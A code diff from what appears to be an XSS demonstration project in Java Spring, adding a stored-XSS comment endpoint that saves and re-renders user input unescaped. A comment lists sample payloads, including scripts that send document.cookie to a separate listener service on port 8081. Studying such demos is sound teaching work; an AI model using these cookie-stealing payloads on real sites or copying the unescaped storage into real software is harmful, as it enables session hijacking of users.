@@ -2,13 +2,18 @@ package org.moonzhou.xss.web;
 
 import org.apache.commons.text.StringEscapeUtils;
 import org.moonzhou.xss.constants.CommonConstants;
+import org.moonzhou.xss.dto.Comment;
 import org.moonzhou.xss.dto.User;
+import org.moonzhou.xss.service.CommentService;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.*;
 import org.springframework.web.servlet.ModelAndView;
 
 import java.io.UnsupportedEncodingException;
+import java.util.ArrayList;
 import java.util.Base64;
+import java.util.List;
 
 /**
  * @author moon-zhou <ayimin1989@163.com>
@@ -25,6 +30,9 @@ public class XSSController {
      * 简单的XSS测试示例，弹框
      */
     private static final String XSS_SCRIPT_ALERT = "<script>alert('it is a xss test!')</script>";
+
+    @Autowired
+    private CommentService commentService;
 
     /**
      * http://localhost:8080/xss/simpleDemo
@@ -145,5 +153,73 @@ public class XSSController {
 
     /*****************************************************************************/
 
+    /**
+     * http://localhost:8080/xss/commentPage
+     * 进入存储型XSS示例页面
+     * @return
+     */
+    @RequestMapping("/commentPage")
+    ModelAndView commentPage() {
 
+        // 查询所有的数据展示出来
+        List<Comment> commentList = commentService.getAllComment();
+
+        ModelAndView modelAndView = new ModelAndView("commentPage");
+        modelAndView.addObject("commentList", commentList);
+
+        return modelAndView;
+    }
+
+    /**
+     *
+     * http://localhost:8080/xss/saveXSS
+     *
+     * 提交：<script>alert('it is a xss test!')</script>
+     * <script>$.ajax({url:"http://localhost:8081/listener/log",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>
+     * <script>$.ajax({url:"http://localhost:8081/listener/store",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>
+     *
+     * 页面提交请求，存储后返回
+     * 存储型XSS请求
+     * @return
+     */
+    @RequestMapping("/saveXSS")
+    ModelAndView saveXSS(Comment comment) {
+
+        // 保存评论
+        commentService.insertComment(comment);
+
+        // 查询所有的数据展示出来
+        List<Comment> commentList = commentService.getAllComment();
+
+        ModelAndView modelAndView = new ModelAndView("commentPage");
+        modelAndView.addObject("commentList", commentList);
+
+        return modelAndView;
+    }
+
+
+
+    /**
+     *
+     * http://localhost:8080/xss/querySaveXSS
+     * 直接查询存储的xss内容返回
+     * @return
+     */
+    @RequestMapping("/querySaveXSS")
+    @ResponseBody
+    String querySaveXSS() {
+        return "xssPage";
+    }
+
+    /**
+     *
+     * http://localhost:8080/xss/querySaveWithoutXSS
+     * 直接查询存储的xss内容，处理后返回，避免XSS
+     * @return
+     */
+    @RequestMapping("/querySaveWithoutXSS")
+    @ResponseBody
+    String querySaveWithoutXSS() {
+        return "xssPage";
+    }
 }
